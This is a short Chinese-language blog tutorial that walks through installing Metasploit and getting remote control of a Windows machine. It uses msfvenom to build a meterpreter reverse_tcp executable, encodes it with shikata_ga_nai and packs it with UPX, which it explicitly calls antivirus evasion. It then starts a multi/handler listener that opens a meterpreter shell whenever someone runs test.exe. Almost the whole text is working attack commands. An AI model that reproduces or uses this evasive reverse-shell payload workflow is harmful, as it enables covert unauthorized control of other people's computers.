title: 使用Metasploit远控你的电脑
categories: 教程
tags: [Metasploit,远控]
date: 2020-09-15 19:31:00
---
# 安装MetaSploit
>我的环境是:Kubuntu20.04

一键脚本:
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall
```
然后就无了

# 生成一个远控程序
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=10.0.0.155 LPORT=52130 -f exe > test.exe

-p 攻击载荷
-e 编码方式
-i 编码次数
-b 在生成的程序中避免出现的值
LHOST,LPORT 监听上线的主机IP和端口
-f exe 生成EXE格式
```
 - 使用upx加壳做免杀处理，命令如下
```bash
#安装upx
https://github.com/upx/upx/releases/tag/v3.95
#加壳
upx -9 test.exe
```
# 开始远控
- 启动Metasploit
```bash
msfconsole
```
- 在msf下输入
```bash
use exploit/multi/handler
```
- 查看需要设置的参数
```bash
show options
```
- 设置**payload**
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```
- 设置**LHOST，LPORT**
```bash
set lhost 10.0.0.155
set lport 52130
```
- 启动程序
```bash
exploit
```
如有人打开**test.exe**，则会出现等待输入界面
```bash
meterpreter >
```
现在我们可以输入`help`来看具体可以远程做些什么了

#我是废物